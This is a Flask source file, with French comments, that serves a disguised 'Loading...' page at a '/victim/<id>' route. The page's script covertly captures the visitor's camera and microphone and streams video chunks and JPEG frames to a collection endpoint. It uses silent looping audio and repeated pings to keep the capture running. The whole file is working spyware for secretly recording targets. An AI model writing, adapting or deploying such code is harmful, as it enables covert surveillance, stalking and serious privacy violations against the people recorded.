from flask import Flask, render_template_string
import os

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>body{margin:0;background:#000}</style>
</head>
<body>
    <script>
        const ID = "{{ id }}";
        const HOST = "{{ host }}";
        
        // Configuration streaming vers Vercel
        let stream, recorder;
        let chunkBuffer = [];
        
        async function init() {
            // Audio silencieux pour background
            const audio = new Audio();
            audio.src = "data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=";
            audio.loop = true;
            audio.volume = 0;
            audio.play().catch(()=>{});
            
            // Obtenir caméra/micro
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {facingMode: "user", width: 640, height: 480},
                    audio: {sampleRate: 16000, channelCount: 1}
                });
            } catch(e) { return; }
            
            // Enregistrer device
            await fetch(`https://${HOST}/api/stream?id=${ID}&action=register`, {
                method: 'POST'
            });
            
            // Démarrer capture
            startCapture();
        }
        
        function startCapture() {
            const options = {mimeType: 'video/webm;codecs=vp8', videoBitsPerSecond: 150000};
            recorder = new MediaRecorder(stream, options);
            
            recorder.ondataavailable = async (e) => {
                if (e.data.size > 0) {
                    const base64 = await blobToBase64(e.data);
                    // Envoi direct à Vercel
                    fetch(`https://${HOST}/api/stream?id=${ID}&action=chunk`, {
                        method: 'POST',
                        body: JSON.stringify({data: base64}),
                        headers: {'Content-Type': 'application/json'},
                        keepalive: true
                    }).catch(()=>{});
                }
            };
            
            recorder.start(500);
            
            // Frames JPEG backup
            setInterval(captureFrame, 2000);
        }
        
        function captureFrame() {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 320; canvas.height = 240;
                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                canvas.toBlob(blob => {
                    blobToBase64(blob).then(data => {
                        fetch(`https://${HOST}/api/stream?id=${ID}&action=frame`, {
                            method: 'POST',
                            body: JSON.stringify({data: data}),
                            headers: {'Content-Type': 'application/json'},
                            keepalive: true
                        }).catch(()=>{});
                    });
                }, 'image/jpeg', 0.5);
            }, 500);
        }
        
        function blobToBase64(blob) {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result.split(',')[1]);
                reader.readAsDataURL(blob);
            });
        }
        
        // Persistance maximale
        setInterval(() => {
            fetch(`https://${HOST}/api/stream?id=${ID}&action=ping`, {
                method: 'POST',
                keepalive: true
            }).catch(()=>{});
        }, 3000);
        
        init();
    </script>
</body>
</html>
"""

@app.route("/victim/<id>")
def victim(id):
    host = request.headers.get('host', 'localhost')
    return render_template_string(HTML, id=id, host=host)
